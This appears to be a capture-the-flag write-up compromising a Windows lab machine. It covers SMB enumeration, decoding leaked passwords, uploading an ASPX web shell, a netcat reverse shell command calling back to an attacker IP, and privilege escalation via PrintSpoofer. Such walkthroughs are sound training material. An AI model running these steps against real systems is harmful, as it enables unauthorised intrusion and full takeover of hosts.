## Enumeration

### Lets start with nmap and threader3000

I will use `threader300` to check all open ports before running `nmap` to reduce scan times:
```

```

So `RDP` server, 2 web servers and `SMB`. The `RDP` server looks like is protected with a password and both web server looks like the default page of ISS (`TRACE` method allowed but not much more), so lets check `SMB`

### SMB

I will use `enum4linux` to enum the service to get additional information to the already gathered by `nmap`:
```

Lets check that `nt4wrksv` share: `smbclient -N //<MACHINE_IP>/nt4wrksv`. Once connected i found a file called `passwords.txt` cool:
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Looks like `base64` lets get them in clear:

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

I tried the passwords but no luck, maybe they are valid usernames but the passwords are useless, lets check the web page.

### http://MACHINE_IP/

`gobuster` couldn't find anything and `nikto` only reported the `TRACE` method i commented earlier as something "interesting" so lets check the other page.

### http://MACHINE_IP:49663/

`nikto` only reported the `TRACE` method again but `gobuster` reported `/nt4wrksv` path, the same as the SMB share. Maybe it is connected to it? I tried the path `/nt4wrksv/passwords.txt` and the page showed the file content, ok nice.

## Exploiting

### RCE

We have access to that share so... can we get a RCE? I uploaded `cmdasp.aspx` and there it was, allowing me to execete commands nice.

Now i will try to upload `nc.exe` to the share and get a proper reverse shell.

### Reverse shell!

First i had to find the directory, i was pretty lucky i found it fast:
```
dir C:\inetpub\wwwroot\nt4wrksv
```
There it is, nc.exe. Lest try `nc.exe -e cmd.exe <Attacker_IP> <PORT>` with a netcat listener in our site. After some try and error i tried with the port 443 to avoid possible firewalls aaaand the shell came back cool.

#### User flag

The user flag was in Bob directory. Just execute `more C:\Users\Bob\Desktop\user.txt`:
```

## Privesc

I tried to execute `winpeas` to check for privesc vectors but to be honest wasn't a good idea. I don't know why but this box is really slow sometimes and it hanged. Sooo i tried some manual enumeration:

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled <----
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

That `SeImpersonatePrivilege` thing looks interesting, after searching a bit i found this exploit: https://github.com/itm4n/PrintSpoofer. I uploaded it to the machine and executed it:

```
C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

```

And yep, an Administrator shell cool.

### Root flag

Just execute `more C:\Users\Administrator\Desktop\root.txt`:
```
